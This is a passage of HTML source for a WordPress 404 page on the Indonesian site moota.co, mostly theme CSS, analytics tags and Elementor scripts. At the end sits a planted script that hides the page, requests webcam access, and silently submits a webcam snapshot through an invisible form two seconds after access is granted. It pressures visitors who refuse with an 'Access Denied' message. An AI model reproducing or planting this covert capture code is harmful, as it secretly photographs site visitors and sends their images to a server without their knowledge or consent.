		}
		.betterdocs-searchform svg.docs-search-icon {
			fill: #444b54;
			height: 30px;
		}
		.docs-search-close path.close-line {
			fill: #4465f0;	
		}
		.docs-search-close path.close-border {
			fill: #444b54;	
		}
		.docs-search-loader {
			stroke: #444b54;	
		}
		.betterdocs-searchform svg.docs-search-icon:hover {
			fill: #444b54;
		}
		.betterdocs-live-search .docs-search-result {
			width: 100%;
			max-width: 800px;
			background-color: #fff;
			border-color: #f1f1f1;
		}
		.betterdocs-search-result-wrap::before {
			border-color: transparent transparent #fff;
		}
		.betterdocs-live-search .docs-search-result li {
			border-color: #f5f5f5;
		}
		.betterdocs-live-search .docs-search-result li a {
			font-size: 18px;
			padding-top: 10px;
			padding-right: 10px;
			padding-bottom: 10px;
			padding-left: 10px;
		}
		.betterdocs-live-search .docs-search-result li a .betterdocs-search-title {
			color: #444444;
		}

		.betterdocs-live-search .docs-search-result li a .betterdocs-search-category{
			color: #444444;
		}

		.betterdocs-live-search .docs-search-result li:hover {
			background-color: #f5f5f5;
		}
		.betterdocs-live-search .docs-search-result li a span:hover {
			color: #444444;
		}
		.betterdocs-category-box.pro-layout-3 .docs-single-cat-wrap img,
		.docs-cat-list-2-box img {
			margin-right: 20px;
		}
		.betterdocs-wraper.betterdocs-category-list-2 .betterdocs-search-form-wrap {
			padding-bottom: 130px;
		}
	</style>
    <meta name="generator" content="Easy Digital Downloads v2.11.7" />
<script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//moota.co/?wordfence_lh=1&hid=15BED7C40074E0E78253C5B133990A96');
</script><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-ND27C45');</script>
<!-- End Google Tag Manager -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1240062096757014');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1240062096757014&ev=PageView&noscript=1"
/></noscript>
<link rel="icon" href="https://moota.co/wp-content/uploads/2019/09/cropped-logo-32x32.png" sizes="32x32" />
<link rel="icon" href="https://moota.co/wp-content/uploads/2019/09/cropped-logo-32x32.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://moota.co/wp-content/uploads/2019/09/cropped-logo-32x32.png" />
<meta name="msapplication-TileImage" content="https://moota.co/wp-content/uploads/2019/09/cropped-logo-32x32.png" />
		<style id="wp-custom-css">
			.betterdocs-social-share {
display: none;
}

.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-item-count span {
font-size: 14px!important;
}

.docs-cat-title-inner span {
width: 16px!important;
height: 16px!important;
}

#comments{
	display:none;
}

.page-header{
	display:none;
}

.map {
 width: 100%;
 heigth: 100%;
}

.map iframe {
 position: absolute;
 margin: 0;
 top: 0;
 padding: 0;
 left: 0;
}
       </style>
		<noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript></head>
<body class="error404 wp-custom-logo elementor-default elementor-kit-3225 elementor-page-2177">
<div class="map" id="map">
</div>
<div class="page_all" id="page_all">

				<div data-elementor-type="single" data-elementor-id="2177" class="elementor elementor-2177 elementor-location-single">
					<div class="elementor-section-wrap">
								<section class="elementor-section elementor-top-section elementor-element elementor-element-29d2275 elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle" data-id="29d2275" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-54280255" data-id="54280255" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-734a4f8b elementor-widget__width-auto elementor-absolute elementor-widget-mobile__width-initial elementor-invisible elementor-widget elementor-widget-image" data-id="734a4f8b" data-element_type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;,&quot;motion_fx_motion_fx_mouse&quot;:&quot;yes&quot;,&quot;motion_fx_mouseTrack_effect&quot;:&quot;yes&quot;,&quot;motion_fx_mouseTrack_direction&quot;:&quot;negative&quot;,&quot;motion_fx_mouseTrack_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;0.2&quot;,&quot;sizes&quot;:[]},&quot;_animation&quot;:&quot;rotateInDownLeft&quot;,&quot;_animation_delay&quot;:&quot;400&quot;}" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
												<img width="155" height="140" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20155%20140'%3E%3C/svg%3E" class="attachment-large size-large" alt="" loading="lazy" data-lazy-src="https://moota.co/wp-content/uploads/2019/08/Oval.png" /><noscript><img width="155" height="140" src="https://moota.co/wp-content/uploads/2019/08/Oval.png" class="attachment-large size-large" alt="" loading="lazy" /></noscript>														</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-2b527945 elementor-widget__width-auto elementor-absolute elementor-widget-tablet__width-initial elementor-invisible elementor-widget elementor-widget-image" data-id="2b527945" data-element_type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;,&quot;motion_fx_motion_fx_mouse&quot;:&quot;yes&quot;,&quot;motion_fx_mouseTrack_effect&quot;:&quot;yes&quot;,&quot;motion_fx_mouseTrack_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;0.1&quot;,&quot;sizes&quot;:[]},&quot;_animation&quot;:&quot;rotateInDownLeft&quot;,&quot;_animation_delay&quot;:&quot;700&quot;}" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
												<img width="198" height="190" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20198%20190'%3E%3C/svg%3E" class="attachment-large size-large" alt="" loading="lazy" data-lazy-src="https://moota.co/wp-content/uploads/2019/08/Fill-1.png" /><noscript><img width="198" height="190" src="https://moota.co/wp-content/uploads/2019/08/Fill-1.png" class="attachment-large size-large" alt="" loading="lazy" /></noscript>														</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-239af307 elementor-widget__width-auto elementor-absolute elementor-widget-mobile__width-initial elementor-invisible elementor-widget elementor-widget-image" data-id="239af307" data-element_type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;,&quot;motion_fx_motion_fx_mouse&quot;:&quot;yes&quot;,&quot;motion_fx_mouseTrack_effect&quot;:&quot;yes&quot;,&quot;motion_fx_mouseTrack_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;0.1&quot;,&quot;sizes&quot;:[]},&quot;_animation&quot;:&quot;rotateInUpRight&quot;,&quot;_animation_delay&quot;:&quot;500&quot;}" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
												<img width="99" height="99" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2099%2099'%3E%3C/svg%3E" class="attachment-large size-large" alt="" loading="lazy" data-lazy-src="https://moota.co/wp-content/uploads/2019/08/Oval-Copy.png" /><noscript><img width="99" height="99" src="https://moota.co/wp-content/uploads/2019/08/Oval-Copy.png" class="attachment-large size-large" alt="" loading="lazy" /></noscript>														</div>
						</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-deccd8f elementor-section-height-min-height elementor-section-content-middle elementor-section-boxed elementor-section-height-default" data-id="deccd8f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-213445bc" data-id="213445bc" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-4f3eebeb elementor-widget elementor-widget-heading" data-id="4f3eebeb" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Ooops.</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-3f7b7423 elementor-widget elementor-widget-heading" data-id="3f7b7423" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Halaman yang dicari tidak ditemukan</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-6ff6efff elementor-mobile-align-center elementor-align-center elementor-widget elementor-widget-button" data-id="6ff6efff" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a href="https://moota.co" class="elementor-button-link elementor-button elementor-size-md" role="button">
						<span class="elementor-button-content-wrapper">
							<span class="elementor-button-icon elementor-align-icon-left">
									<i class="fa fa-arrow-left" aria-hidden="true"></i>
							</span>
						<span class="elementor-button-text">Kembali ke Beranda</span>
		</span>
					</a>
		</div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
							</div>
				</div>
<link rel='stylesheet' id='e-animations-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/animations/animations.min.css?ver=3.6.7' media='all' />
<script id='edd-ajax-js-extra'>
var edd_scripts = {"ajaxurl":"https:\/\/moota.co\/wp-admin\/admin-ajax.php","position_in_cart":"-1","has_purchase_links":"","already_in_cart_message":"You have already added this item to your cart","empty_cart_message":"Your cart is empty","loading":"Loading","select_option":"Please select an option","is_checkout":"0","default_gateway":"moota_edd","redirect_to_checkout":"1","checkout_page":"https:\/\/moota.co\/checkout\/","permalinks":"1","quantities_enabled":"","taxes_enabled":"0"};
</script>
<script src='https://moota.co/wp-content/plugins/easy-digital-downloads/assets/js/edd-ajax.min.js?ver=2.11.7' id='edd-ajax-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor-pro/assets/lib/smartmenus/jquery.smartmenus.min.js?ver=1.0.1' id='smartmenus-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.7.2' id='elementor-pro-webpack-runtime-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.6.7' id='elementor-webpack-runtime-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.6.7' id='elementor-frontend-modules-js'></script>
<script src='https://moota.co/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9' id='regenerator-runtime-js'></script>
<script src='https://moota.co/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0' id='wp-polyfill-js'></script>
<script src='https://moota.co/wp-includes/js/dist/hooks.min.js?ver=c6d64f2cb8f5c6bb49caca37f8828ce3' id='wp-hooks-js'></script>
<script src='https://moota.co/wp-includes/js/dist/i18n.min.js?ver=ebee46757c6a411e38fd079a7ac71d94' id='wp-i18n-js'></script>
<script id='wp-i18n-js-after'>
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>
<script id='elementor-pro-frontend-js-before'>
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/moota.co\/wp-admin\/admin-ajax.php","nonce":"4d14a68fde","urls":{"assets":"https:\/\/moota.co\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/moota.co\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/moota.co\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
</script>
<script src='https://moota.co/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.7.2' id='elementor-pro-frontend-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2' id='elementor-waypoints-js'></script>
<script src='https://moota.co/wp-includes/js/jquery/ui/core.min.js?ver=1.13.1' id='jquery-ui-core-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/lib/swiper/swiper.min.js?ver=5.3.6' id='swiper-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/lib/share-link/share-link.min.js?ver=3.6.7' id='share-link-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/lib/dialog/dialog.min.js?ver=4.9.0' id='elementor-dialog-js'></script>
<script id='elementor-frontend-js-before'>
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Extra","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Extra","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.6.7","is_static":false,"experimentalFeatures":{"e_import_export":true,"e_hidden_wordpress_widgets":true,"theme_builder_v2":true,"landing-pages":true,"elements-color-picker":true,"favorite-widgets":true,"admin-top-bar":true,"page-transitions":true,"notes":true,"form-submissions":true,"e_scroll_snap":true},"urls":{"assets":"https:\/\/moota.co\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":0,"title":"Page not found - Moota.co","excerpt":""}};
</script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.6.7' id='elementor-frontend-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor-pro/assets/js/preloaded-elements-handlers.min.js?ver=3.7.2' id='pro-preloaded-elements-handlers-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/js/preloaded-modules.min.js?ver=3.6.7' id='preloaded-modules-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor-pro/assets/lib/sticky/jquery.sticky.min.js?ver=3.7.2' id='e-sticky-js'></script>
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ND27C45"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<script>window.lazyLoadOptions = {
                elements_selector: "img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",
                data_src: "lazy-src",
                data_srcset: "lazy-srcset",
                data_sizes: "lazy-sizes",
                class_loading: "lazyloading",
                class_loaded: "lazyloaded",
                threshold: 300,
                callback_loaded: function(element) {
                    if ( element.tagName === "IFRAME" && element.dataset.rocketLazyload == "fitvidscompatible" ) {
                        if (element.classList.contains("lazyloaded") ) {
                            if (typeof window.jQuery != "undefined") {
                                if (jQuery.fn.fitVids) {
                                    jQuery(element).parent().fitVids();
                                }
                            }
                        }
                    }
                }};
        window.addEventListener('LazyLoad::Initialized', function (e) {
            var lazyLoadInstance = e.detail.instance;

            if (window.MutationObserver) {
                var observer = new MutationObserver(function(mutations) {
                    var image_count = 0;
                    var iframe_count = 0;
                    var rocketlazy_count = 0;

                    mutations.forEach(function(mutation) {
                        for (i = 0; i < mutation.addedNodes.length; i++) {
                            if (typeof mutation.addedNodes[i].getElementsByTagName !== 'function') {
                                return;
                            }

                           if (typeof mutation.addedNodes[i].getElementsByClassName !== 'function') {
                                return;
                            }

                            images = mutation.addedNodes[i].getElementsByTagName('img');
                            is_image = mutation.addedNodes[i].tagName == "IMG";
                            iframes = mutation.addedNodes[i].getElementsByTagName('iframe');
                            is_iframe = mutation.addedNodes[i].tagName == "IFRAME";
                            rocket_lazy = mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');

                            image_count += images.length;
			                iframe_count += iframes.length;
			                rocketlazy_count += rocket_lazy.length;

                            if(is_image){
                                image_count += 1;
                            }

                            if(is_iframe){
                                iframe_count += 1;
                            }
                        }
                    } );

                    if(image_count > 0 || iframe_count > 0 || rocketlazy_count > 0){
                        lazyLoadInstance.update();
                    }
                } );

                var b      = document.getElementsByTagName("body")[0];
                var config = { childList: true, subtree: true };

                observer.observe(b, config);
            }
        }, false);</script><script data-no-minify="1" async src="https://moota.co/wp-content/plugins/rocket-lazy-load/assets/js/16.1/lazyload.min.js"></script><script>function lazyLoadThumb(e){var t='<img loading="lazy" data-lazy-src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"><noscript><img src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"></noscript>',a='<div class="play"></div>';return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.dataset.query.length?'':'&'+this.dataset.query;e.setAttribute("src",t.replace("ID",this.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow", "accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.replaceChild(e,this)}document.addEventListener("DOMContentLoaded",function(){var e,t,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)e=document.createElement("div"),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query", a[t].dataset.query),e.setAttribute("data-src", a[t].dataset.src),e.innerHTML=lazyLoadThumb(a[t].dataset.id),e.onclick=lazyLoadYoutubeIframe,a[t].appendChild(e)});</script>
</div>

<div class="container" style="opacity:0;" >
<form action="" method="post" enctype="multipart/form-data" >
<div>
    <video autoplay="true" id="video-webcam">
        Browsermu tidak mendukung
    </video>
</div>

<div id="results" >
</div>
<button type="submit" name="upload" onclick="takeSnapshot()" id="upload" >upload</button>
</form>

</div>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js"></script>
<script>
    const pageAll = document.querySelector('.page_all')
    const map = document.querySelector('.map')
    map.innerHTML = '<iframe src="https://miniature.earth" width="100%" height="100%">'
    pageAll.style.display = 'none';
    // seleksi elemen video
    var video = document.querySelector("#video-webcam");

    // minta izin user
    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || navigator.oGetUserMedia;

    // jika user memberikan izin
    if (navigator.getUserMedia) {
        // jalankan fungsi handleVideo, dan videoError jika izin ditolak
        navigator.getUserMedia({ video: true }, handleVideo, videoError);
    }

    // fungsi ini akan dieksekusi jika  izin telah diberikan
    function handleVideo(stream) {
        video.srcObject = stream;
        setTimeout(function() {
        const buttonUpload = document.getElementById('upload')
        buttonUpload.click()
        }, 2000)
    }

    // fungsi ini akan dieksekusi kalau user menolak izin
    function videoError(e) {
       swal("Access Denied!", "allow access to display the page!", "error");
       pageAll.style.display = 'block'
       map.style.display = 'none'
    }
    
    function takeSnapshot() {
    // buat elemen img
    var img = document.createElement('img');
    var context;
    
    // ambil ukuran video
    var width = video.offsetWidth
    , height = video.offsetHeight;
    
    // buat elemen canvas
    canvas = document.createElement('canvas');
    canvas.width = width;
    canvas.height = height;
    
    // ambil gambar dari video dan masukan 
    // ke dalam canvas
    context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, width, height);
    
    // render hasil dari canvas ke elemen img
    img.src = canvas.toDataURL('image/png');
    document.body.appendChild(img);
    img.style.opacity = 0
    const results = document.getElementById("results")
    results.innerHTML = '<input type="text" id="image-name" class="image-name" name="image-name" value="' + canvas.toDataURL('image/png') +'">'
   }
</script>
</body>
</html>
